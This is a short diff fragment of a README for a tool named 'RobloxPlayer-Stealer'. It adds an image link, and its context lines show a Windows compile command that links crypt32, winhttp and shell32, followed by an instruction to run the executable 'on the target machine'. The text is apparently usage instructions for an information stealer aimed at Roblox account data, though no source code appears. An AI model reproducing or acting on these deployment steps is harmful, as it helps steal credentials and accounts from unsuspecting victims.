@@ -12,6 +12,7 @@
    cl main.cpp /EHsc /Fe:RobloxPlayer-Stealer.exe /link crypt32.lib winhttp.lib shell32.lib
    ```
 4. Run the resulting executable on the target machine.
+![Без названия-1](https://github.com/user-attachments/assets/96676ef4-0815-4f2d-98bc-9d2f56769679)
 
 ## Disclaimer
 
